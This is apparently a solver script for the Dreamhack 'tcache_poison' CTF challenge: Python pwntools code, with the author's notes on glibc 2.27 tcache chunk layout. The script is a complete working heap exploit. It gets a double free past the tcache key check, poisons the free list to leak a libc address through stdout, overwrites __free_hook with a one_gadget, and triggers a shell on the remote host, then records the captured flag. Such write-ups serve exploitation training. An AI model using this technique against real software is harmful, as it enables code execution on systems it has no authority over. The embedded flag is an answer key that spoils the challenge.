'''
does the size of the chunk matter?

allocate two tcache eligible chunks 
free them in the same order afterwards
use an overflow to overwrite fd pointer in second chunk with our location?
this overwrite would be something like a __free_pointer?
step 1: achieve double free using the bk pointer
--
| ???
| size
| fd pointer <-- read from 4 will affect this
| bk pointer
--
^^^ this might be incorrect
correct model since the bk pointer actually does not exist
--
| ???
| size
| ???
| fd pointer?
--

line 4226 here? https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c

No that is also incorrect; there was hardening done so there was "key" value added to prevent double free attacks 
--
| ???
| size
| fd pointer
| key
--
'''



from pwn import *
LOCAL = False
if LOCAL:
    r = process ('./tcache_poison')
    e = ELF("./tcache_poison")
    libc = ELF("./libc-2.27.so")
else:
    r = remote('host3.dreamhack.games', 23843)
    e = ELF("./tcache_poison")
    libc = ELF("./libc-2.27.so")

def malloc(size : int, content ):
    r.recvuntil("Edit\n")
    r.sendline("1")
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", content)

def edit(content ):
    r.recvuntil("Edit\n")
    r.sendline("4")
    r.sendafter(": ", content)

def free():
    r.recvuntil("Edit\n")
    r.sendline("2")

def content():
    r.recvuntil("Edit\n")
    r.sendline("3")

malloc(0x30, b"a")
free()
# we can do a double free since the fd pointer has been modified?; Note, NEED the \x00 for some reason; not sure why
# ok it seems like any value that isn't the original is fine? Again, not sure why this is the case
# ok i think the model i have above is incorrect
# basically, the reason the value \x00 is used is because the tcache free list points to 0x600c00
# 0x600c10 is the start of the data
# so when the chunk gets allocated, it will use the fd pointer for the next location of the free list, which would be 0x600c00, which would have the fd as 0x600c10 causing a uaf bug
# actually, why do I need to call free a second time? <-- need to double check why this is the case 
# if i dont call free a second time, after the allocation, the free list is just gone
# ok i cannot call free twice, so i have to modify the fd pointer to be something else 
""" edit(b'A' * 8 + b'B' * 8)  """

edit(b'A' * 8 + b'\x00') 
free() 

stdout = e.symbols["stdout"]
print("stdout got address: ", hex(stdout))
malloc(0x30, p64(stdout)) # what malloc pointer does this return? 0x10f02a0, which points to itself and we overwrite the memory at 0x10f02a0 with p64(stdout)
malloc(0x30, 'D' * 8) # what malloc pointer does this return? 0x10f02a0 is returned again 

malloc(0x30, b'\x60') # what malloc pointer does this return? a new pointer which is 0x10f02d0 so something different from what we have already
# note: need to do \x60 because we should not be modifying the stdout value

content();
r.recvuntil("Content: ")
elf_stdout = u64(r.recv(6).ljust(8, b"\x00"))
print(hex(stdout))
libc_stdout = libc.symbols["_IO_2_1_stdout_"]
print("libc stdout: ", hex(libc_stdout))
base = elf_stdout - libc_stdout
print("base: ", hex(base))
free_hook = base + libc.symbols["__free_hook"]
print("free hook: ", hex(free_hook)) 
one_gadget = base + 0x4f432 # tested different onegadgets from one_gadget command
print("one gadget: ", hex(one_gadget))
malloc(0x40, 'A' * 8)
free()

edit(b'A' * 8 + b'\x00') # bypass the key 
free()
malloc(0x40, p64(free_hook))
malloc(0x40, 'D' * 8)
malloc(0x40, p64(one_gadget))
""" gdb.attach(r) """
""" time.sleep(1) """

free()
""" print("stdout value: ", val) """
# replace with gadget
r.interactive()


# flag: DH{f9e02bd556d6643f11d9a83570ef5192795cf91c6b443cd603e9f83787ab02fc}

